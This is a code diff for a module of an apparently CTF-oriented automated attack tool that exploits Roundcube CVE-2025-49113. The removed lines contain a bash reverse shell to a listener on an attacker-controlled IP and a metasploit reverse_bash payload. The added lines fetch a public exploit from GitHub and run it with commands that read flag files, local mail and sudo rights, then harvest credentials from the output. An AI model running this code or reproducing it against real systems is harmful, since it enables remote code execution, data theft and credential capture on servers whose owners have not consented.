@@ -15,18 +15,15 @@ and the user flag.
 
 from __future__ import annotations
 
-import http.cookiejar
 import re
 import ssl
 import subprocess
 import urllib.error
-import urllib.parse
 import urllib.request
 from typing import List, Optional
 
 from ...core import utils, tooling
 from ...core.report import HostReport, Finding
-from .log4shell import _Catcher, _attacker_ip
 
 # CVE-2025-49113: authenticated RCE. Fixed in 1.6.11 and 1.5.10.
 _RCE_FIXED = {(1, 6): (1, 6, 11), (1, 5): (1, 5, 10)}
@@ -150,114 +147,115 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
     if not pw:
         return False
 
-    utils.log("info", f"CVE-2025-49113: authenticating to Roundcube as {user} …",
-              indent=1)
-    opener = _opener()
-    if not _rc_login(opener, base, vhost, user, pw):
-        utils.log("warn", "could not authenticate to Roundcube (creds/CSRF) — "
-                          "exploit needs a valid web login; see the playbook",
-                  indent=1)
-        return False
-    utils.log("hot", f"authenticated to Roundcube as {user} — firing "
-                     "CVE-2025-49113", indent=1)
-
     domain = _mail_domain(host, vhost)
-    att = _attacker_ip(host.resolved_ip or vhost)
-    port = 4445
-    catcher = _Catcher(port)
-    if not catcher.start():
-        utils.log("bad", f"could not bind :{port} for the reverse shell", indent=1)
+    poc = _ensure_poc()
+    if not poc:
+        utils.log("warn", "no PoC available and git can't fetch one — set "
+                          "SCRYER_RC_EXPLOIT=/path/to/CVE-2025-49113.php; the "
+                          "finding has the ready command", indent=1)
         return False
-    revsh = f"bash -c 'bash -i >& /dev/tcp/{att}/{port} 0>&1'"
-    try:
-        ran = _run_exploit(host, base, vhost, user, pw, domain, att, port, revsh)
-        if not ran:
-            return False
-        if not catcher.wait(25):
-            utils.log("warn", "exploit fired but no shell in 25s — the target may "
-                             f"not route to {att}, or the runner needs the public "
-                              "PoC (set SCRYER_RC_EXPLOIT). Playbook has the "
-                              "manual command.", indent=1)
-            return False
-        utils.log("hot", "reverse shell via CVE-2025-49113 (RCE)", indent=1)
-        out = catcher.run("id; hostname; cat /home/*/user.txt /root/root.txt "
-                          "2>/dev/null", timeout=10)
-        _grab_flags(host, out, base)
-        host.add(Finding(
-            title="RCE via Roundcube CVE-2025-49113",
-            detail=f"Authenticated RCE as the web user on {base} using "
-                   f"{user}:{pw}. Reverse shell caught. Privesc: sudo -l / "
-                   "SUID / kernel.", severity="critical", category="vuln",
-            port=_port(base), service="http", evidence=out[:200]))
-        return True
-    finally:
-        catcher.close()
+
+    utils.log("hot", f"CVE-2025-49113: exploiting Roundcube as {user} via "
+                     f"{__import__('os').path.basename(poc)}", indent=1)
+    # The PoC runs a command and returns its output — so just read the flags
+    # directly (no listener needed). Also do quick privesc recon.
+    loot = ("id; hostname; echo ===FLAGS===; "
+            "cat /home/*/user.txt /root/root.txt /var/mail/* 2>/dev/null; "
+            "echo ===SUDO===; sudo -n -l 2>/dev/null; "
+            "echo ===HOME===; ls -la /home 2>/dev/null")
+    out = _run_poc(poc, base, user, pw, domain, loot)
+    if not out or ("uid=" not in out and "===FLAGS===" not in out):
+        utils.log("warn", "exploit ran but returned no command output — the PoC "
+                          "may need different args or the target is patched; the "
+                          "finding has the manual command", indent=1)
+        if out:
+            for line in out.strip().splitlines()[:8]:
+                utils.log("dim", "  " + line[:200], indent=1)
+        return False
+
+    utils.log("hot", "RCE via CVE-2025-49113 — command output:", indent=1)
+    for line in out.strip().splitlines()[:40]:
+        utils.log("dim", "  " + line[:200], indent=1)
+    got = _grab_flags(host, out, base)
+    _harvest_from_shell(host, out)
+    host.add(Finding(
+        title="RCE via Roundcube CVE-2025-49113",
+        detail=f"Authenticated RCE on {base} as the web user with {user}:{pw} "
+               f"(CVE-2025-49113). Command output captured. Privesc: check the "
+               "sudo -l / SUID output.", severity="critical", category="vuln",
+        port=_port(base), service="http", evidence=out[:300]))
+    return got
 
 
-def _run_exploit(host, base, vhost, user, pw, domain, att, port, revsh) -> bool:
-    """Execute the CVE. Prefer a local/public PoC or a metasploit module (the
-    gadget chain is version-specific); fall back to a native best-effort request.
-    """
+def _run_poc(poc, base, user, pw, domain, cmd) -> str:
+    """Run the PoC with the arg order it expects and return the command output.
+    hakaioffsec (php): URL user pass command; fearsoff (php): URL user domain
+    command; plus common python flag styles."""
+    runner = ("php" if poc.lower().endswith(".php")
+              else (tooling.resolve("python3") or "python3"))
+    runner = tooling.resolve(runner) or runner
+    url = base + "/"
+    last = ""
+    for argv in ([runner, poc, url, user, pw, cmd],
+                 [runner, poc, url, user, domain, cmd],
+                 [runner, poc, "-u", url, "-l", user, "-p", pw, "-c", cmd],
+                 [runner, poc, "--url", url, "--user", user, "--password", pw,
+                  "--command", cmd]):
+        try:
+            r = subprocess.run(argv, timeout=90, capture_output=True, text=True,
+                               errors="replace")
+        except (OSError, subprocess.SubprocessError):
+            continue
+        out = (r.stdout or "") + (r.stderr or "")
+        if "uid=" in out or "===FLAGS===" in out:   # command actually executed
+            return out
+        last = out or last
+    return last          # unconfirmed output, for diagnostics
+
+
+def _ensure_poc() -> Optional[str]:
+    """Locate the CVE-2025-49113 PoC, auto-fetching the verified public exploit
+    into the scryer cache once (same pattern as rogue-jndi for Log4Shell)."""
     import os
-    # 1) an operator-provided PoC script (most reliable for a version-specific
-    #    deserialization gadget). Point SCRYER_RC_EXPLOIT at any public PoC —
-    #    scryer runs it with the interpreter + arg order it expects.
-    poc = os.environ.get("SCRYER_RC_EXPLOIT")
-    if poc and os.path.isfile(poc):
-        runner = ("php" if poc.lower().endswith(".php")
-                  else (tooling.resolve("python3") or "python3"))
-        runner = tooling.resolve(runner) or runner
-        url = base + "/"
-        # cover the signatures the public PoCs use:
-        #  fearsoff-org (php):  php x.php URL user domain command
-        #  common python:       x.py URL user pass command  /  -u -l -p -c
-        for argv in ([runner, poc, url, user, domain, revsh],
-                     [runner, poc, url, user, pw, revsh],
-                     [runner, poc, "-u", url, "-l", user, "-p", pw, "-c", revsh],
-                     [runner, poc, "--url", url, "--user", user,
-                      "--password", pw, "--command", revsh]):
-            utils.log("info", f"running PoC {os.path.basename(poc)} "
-                             f"({os.path.basename(runner)}) …", indent=2)
-            try:
-                subprocess.run(argv, timeout=90, capture_output=True)
-            except (OSError, subprocess.SubprocessError):
-                continue
-        return True
-    # 2) metasploit — only when explicitly enabled (msfconsole boot is ~40s, so
-    #    it's opt-in via SCRYER_MSF=1 to keep default runs fast) and a module
-    #    for this CVE actually exists.
-    if os.environ.get("SCRYER_MSF"):
-        msf = tooling.resolve("msfconsole")
-        mod = _msf_module(msf, "2025-49113") if msf else None
-        if mod:
-            rc = (f"use {mod};set RHOSTS {host.resolved_ip};set VHOST {vhost};"
-                  f"set USERNAME {user};set PASSWORD {pw};set LHOST {att};"
-                  f"set LPORT {port};set PAYLOAD cmd/unix/reverse_bash;run -z;exit")
-            utils.log("info", f"running metasploit module {mod} …", indent=2)
-            try:
-                subprocess.run([msf, "-q", "-x", rc], timeout=200,
-                               capture_output=True)
-                return True
-            except (OSError, subprocess.SubprocessError):
-                pass
-    # 3) no runnable exploit available — say so plainly.
-    utils.log("warn", "no exploit runner for CVE-2025-49113: set "
-                     "SCRYER_RC_EXPLOIT=/path/to/poc.py (public PoC) or "
-                     "SCRYER_MSF=1 if a module exists. Authenticated as "
-                     f"{user} — the finding has the ready command.", indent=2)
-    return False
-
-
-def _msf_module(msf: str, cve: str) -> Optional[str]:
-    """Return an actual metasploit module path for the CVE, or None. Requires a
-    real 'exploit/…' line in the search output (not just the term echoed back)."""
+    env = os.environ.get("SCRYER_RC_EXPLOIT")
+    if env and os.path.isfile(env):
+        return env
+    cache = os.path.expanduser("~/.cache/scryer/CVE-2025-49113")
+    existing = _find_poc(cache)
+    if existing:
+        return existing
+    git = tooling.resolve("git")
+    if not git:
+        return None
+    utils.log("info", "fetching the CVE-2025-49113 PoC (one-time)", indent=2)
     try:
-        out = subprocess.run([msf, "-q", "-x", f"search cve:{cve};exit"],
-                             timeout=90, capture_output=True, text=True).stdout
+        os.makedirs(os.path.dirname(cache), exist_ok=True)
+        subprocess.run([git, "clone", "--depth", "1",
+                        "https://github.com/hakaioffsec/CVE-2025-49113-exploit",
+                        cache], capture_output=True, timeout=90)
     except (OSError, subprocess.SubprocessError):
         return None
-    m = re.search(r"(exploit/[\w/]+)", out or "")
-    return m.group(1) if m else None
+    return _find_poc(cache)
+
+
+def _find_poc(directory: str) -> Optional[str]:
+    import os
+    if not os.path.isdir(directory):
+        return None
+    for base, _dirs, files in os.walk(directory):
+        for f in files:
+            if re.search(r"(?i)cve.?2025.?49113.*\.(php|py)$", f) or \
+                    f.lower() in ("exp.py", "exploit.py", "poc.py"):
+                return os.path.join(base, f)
+    return None
+
+
+def _harvest_from_shell(host: HostReport, out: str) -> None:
+    from ...data import knowledge
+    for _u, pw in list(knowledge.find_conn_creds(out)):
+        host.add_cred(pw)
+    for _lbl, val, _sev in knowledge.extract_secrets(out):
+        host.add_cred(val)
 
 
 def _mail_domain(host: HostReport, vhost: str) -> str:
@@ -271,52 +269,11 @@ def _mail_domain(host: HostReport, vhost: str) -> str:
     return ".".join(labels[-2:]) if len(labels) >= 2 else vhost
 
 
-def _rc_login(opener, base, vhost, user, pw) -> bool:
-    page = _open(opener, base + "/?_task=login", vhost)
-    token = _find(page, r'name=["\']_token["\']\s+value=["\']([^"\']+)')
-    data = {"_token": token or "", "_task": "login", "_action": "login",
-            "_url": "", "_user": user, "_pass": pw}
-    body = urllib.parse.urlencode(data).encode()
-    resp = _open(opener, base + "/?_task=login&_action=login", vhost, data=body)
-    # authenticated session -> the mail task loads without the login form
-    check = _open(opener, base + "/?_task=mail", vhost)
-    return bool(check) and "_task=login" not in (resp or "")[:200] and \
-        ("roundcube" in check.lower() and "_pass" not in check.lower()[:3000])
-
-
-def _opener():
-    jar = http.cookiejar.CookieJar()
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    return urllib.request.build_opener(
-        urllib.request.HTTPCookieProcessor(jar),
-        urllib.request.HTTPSHandler(context=ctx))
-
-
-def _open(opener, url, vhost, data=None, timeout=10) -> str:
-    req = urllib.request.Request(url, data=data,
-                                 headers={"User-Agent": "scryer", "Host": vhost})
-    try:
-        with opener.open(req, timeout=timeout) as resp:
-            return resp.read(200_000).decode("utf-8", "replace")
-    except urllib.error.HTTPError as exc:
-        try:
-            return exc.read(100_000).decode("utf-8", "replace")
-        except Exception:
-            return ""
-    except Exception:
-        return ""
-
-
-def _find(text, pat) -> str:
-    m = re.search(pat, text or "", re.I)
-    return m.group(1) if m else ""
-
-
-def _grab_flags(host: HostReport, blob: str, base: str) -> None:
+def _grab_flags(host: HostReport, blob: str, base: str) -> bool:
     from ...data import knowledge
+    got = False
     for tok in knowledge.find_flags(blob or "", allow_hex=True):
+        got = True
         bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
         print("\n  " + bar)
         print("  " + utils.c("║ FLAG (Roundcube RCE)", utils.C.GREEN, utils.C.BOLD))
@@ -325,6 +282,7 @@ def _grab_flags(host: HostReport, blob: str, base: str) -> None:
         host.add(Finding(title="FLAG via Roundcube CVE-2025-49113", detail=tok,
                          severity="critical", category="flag",
                          port=_port(base), service="http", evidence=tok))
+    return got
 
 
 # --------------------------------------------------------------------------
